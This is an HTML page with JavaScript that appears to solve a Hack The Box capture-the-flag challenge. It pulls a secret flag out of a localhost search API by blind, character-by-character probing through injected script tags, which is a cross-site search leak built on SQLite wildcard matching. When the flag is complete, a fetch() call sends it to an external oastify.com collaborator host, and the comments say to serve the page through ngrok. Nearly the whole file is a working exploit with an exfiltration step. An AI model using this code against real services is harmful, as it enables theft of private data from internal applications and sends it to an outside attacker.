<html>
<!--  
    javascript to retrieve web_abusehumandb flag using blind SQL searches
    Serve this page up using `python3 -m http.server` and `ngrok http 8000`
-->

<head>
    <script>

        // I used trial and error to get length of flag, the number of underscores is equal to the length of the flag
        // since underscore is a wildcard in SQLite we need to make some assumptions here.
        var flag = 'HTB{';
        var success = false;
        // reduced character set, flags usually dont use a full character set, be careful of wildcards
        // I havent found a way to escape them
        const chars = '@!0123456789{}abcdefghijklmnopqrstuvwxyz_';
        var char = ''
        var i = 0;


        function sendFlag() {
            // replace with the unique part of the ngrok address
            fetch(`http://5jp6m5n0f6vdzq5i2twig2mbj2ptds1h.oastify.com?char=${encodeURI(flag)}`);
        }

        function loadScript(char) {
            return new Promise((res, rej) => {
                try {
                    newElem = document.createElement('script');
                    newElem.src = "http://127.0.0.1:1337/api/entries/search?q=" + (flag + char);
                    newElem.id = 'pooscript';  
                    newElem.onload = () => {
                        res(char)
                    };
                    newElem.onerror = () => {
                        rej()
                    }; 
                    document.head.appendChild(newElem);
                } catch (e) {
                    rej()
                }
            })
        }

        function getChar() {
            char = chars[i]
            loadScript(char).then((res) => {
                i = 0;
                flag += res;
                console.log(flag)
                if (res == '}') {
                    sendFlag();
                    success = true;
                }else{
                    getChar();
                }
            }).catch(e => {
                {
                    i++;
                    getChar();
                }
            });
            try {
            } catch (e) {

            }

            document.querySelector('#pooscript').remove(); // cleanup, because I am nice.
        }

        getChar();
    </script>

</head>

</html>
